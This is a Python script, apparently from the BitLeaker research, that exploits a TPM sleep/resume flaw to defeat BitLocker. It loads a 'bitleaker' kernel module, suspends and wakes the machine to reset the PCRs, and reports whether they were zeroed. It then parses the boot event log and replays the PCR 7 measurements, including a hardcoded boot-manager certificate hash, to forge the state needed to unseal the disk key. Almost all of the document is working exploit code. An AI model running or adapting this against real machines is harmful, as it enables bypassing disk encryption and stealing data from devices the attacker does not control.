#!/usr/bin/env python

import os
import sys
import subprocess
from collections import defaultdict
from time import sleep

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
SUCCESS = GREEN
FAIL = RED

SUSPEND_TIME = 15
WAIT_TIME = 30

BOOTMGFW_CERT_HASHES = {'sha256': '30bf464ee37f1bc0c7b1a5bf25eced275347c3ab1492d5623ae9f7663be07dd5'}

#
# Print colored message
#
def color_print(message, color):
    sys.stdout.write(color + message + ENDC)
    return

def info_print(message):
    color_print(message, BOLD)

def replay_event_log(output, hashtype = 'sha256'):

    info_print("Replaying TPM event log\n")

    assert 7 in output
    #assert 11 in output

    pcrs = []

    for e in output[7]:

        # Is there a hashtype hash?
        if hashtype in e['hashes']:
            hash = e['hashes'][hashtype]
        else:
            continue

        #print(e)

        #color_print("Extending PCR 7 with %s\n" % hash, WHITE)
        pcrs.append((7, hash))

        if e['event'] == b"EV_SEPARATOR":
            hash = BOOTMGFW_CERT_HASHES[hashtype]
            #color_print("Extending PCR 7 with boot loader hash %s\n" % hash, WHITE)
            pcrs.append((7, hash))
            break

    for pcr, hash in pcrs:
        #print("PCR %d: HASH:%s" % (pcr, hash))
        info_print("Extending PCR 7 with %s\n" % hash)
        cmd = "sudo tpm2_pcrextend %d:%s=%s" % (pcr, hashtype, hash)
        print(cmd)
        subprocess.run(cmd, shell=True)


def parse_event_log():
    log = subprocess.check_output("docker run -v /sys/kernel/security/tpm0/binary_bios_measurements:/tmp/measurements tpm2-tools tpm2_eventlog /tmp/measurements", shell=True).split(b'\n')

    st = {'hashes': {}}

    output = defaultdict(list)

    for l in log:
        if l.startswith(b"- EventNum"):
            #print(st)

            if b'PCRIndex' not in st:
                continue

            pcr = int(st[b'PCRIndex'])
            #print("PCR %d" % pcr)

            et = st[b'EventType']
            #print(et)

            if 'hashes' not in st:
                continue
            #print(st['hashes'])

            output[pcr].append({'event': et, 'hashes': st['hashes']})

            st = {'hashes': {}}

        if l.startswith(b"  "):

            if l.startswith(b"  - AlgorithmId: "):
                st['alg'] = l.split(b": ")[1].decode("utf8")
                #print(st['alg'])
            else:
                cmd, *other = l.split(b": ")
                cmd = cmd[2:]
                #print(cmd, other)

                if cmd == b'  Digest':
                    #print("Digest YEAH %s" % st['alg'])

                    st['hashes'][st['alg']] = other[0][1:-1].decode()
                else:
                    if len(other) == 1:
                        st[cmd] = other[0]
                    else:
                        st[cmd] = other

    #print(log)
    #print(output)
    #sys.exit(1)

    return output

def get_pcrs():
    info_print('Getting PCR values\n')
    output = subprocess.check_output('sudo tpm2_pcrread', shell=True).split(b'\n')

    d = {}
    hash = None

    for l in output:
        #print(l)
        if l == b'':
            pass
        elif l[0] != ord(' '):
            hash = l[:-1]
            d[hash] = {}
        else:
            n, v, *ignore = l.split(b":")
            d[hash][int(n)] = int(v[1:], 16)

    #print(d)

    #sys.exit(1)

    return d

def wait():
    print("Waiting %d seconds" % WAIT_TIME)
    subprocess.run("sleep %d" % WAIT_TIME, shell=True)
 
def sleep():
    #subprocess.run("pm-suspend")
    subprocess.run("rtcwake -m mem -s %d" % SUSPEND_TIME, shell=True)
    #subprocess.run("systemctl suspend", shell=True)
 
def reset_pcrs():
    kmod = os.path.join(os.path.dirname(os.path.realpath(__file__)), "bitleaker-kernel-module/bitleaker-kernel-module.ko")
    info_print('Loading bitleaker kernel module\n')
    subprocess.check_output("insmod %s" % kmod, shell=True)
    info_print("Sleeping and waking\n")
    sleep()
    info_print("Removing kernel module\n")
    subprocess.check_output("rmmod %s" % kmod, shell=True)
    info_print("Sleeping and waking\n")
    wait()
    sleep()
    info_print("Awake, restoring hierarchy\n")
    wait()
    subprocess.run("sleep %d" % WAIT_TIME, shell=True)
    subprocess.run("tpm2_hierarchycontrol -C p shEnable set", shell=True)
    subprocess.run("tpm2_hierarchycontrol -C p ehEnable set", shell=True)

#def suspend():
#    info_print('Sleeping for a few seconds\n')
#    subprocess.check_output('sudo rtcwake -m mem -s %d' % AFEW, shell=True)

#    info_print('Waking up\n')

#    sleep(1)

output = get_pcrs()

hash = next(iter(output))

if 0 not in output[hash]:
    color_print("Unable to find PCR 0\n", FAIL)
    sys.exit(1)

# Fix me for non SHA 256...
if output[hash][0] == 0:
    color_print("PCR 0 was already zero.  Are you sure secure boot is enabled?\n", FAIL)

reset_pcrs()

newoutput = get_pcrs()

if False:
    for l in output:
        info_print('%s\n' % l)

    for l in newoutput:
        info_print('%s\n' % l)

zero = False

for pcr in output[hash].keys():
    old = output[hash][pcr]
    new = newoutput[hash][pcr]
    
    if old != new:
        color_print("PCR %d changed from %s to %s\n" % (pcr, old, new), GREEN)
        if new == 0:
            zero = True

if not zero:
    color_print("Machine does not appear to be vulnerable\n", FAIL)

log = parse_event_log()
#print(log)
replay_event_log(log)
#sys.exit(1)

subprocess.check_output("sudo tpm2_pcrread sha256:7", shell=True)
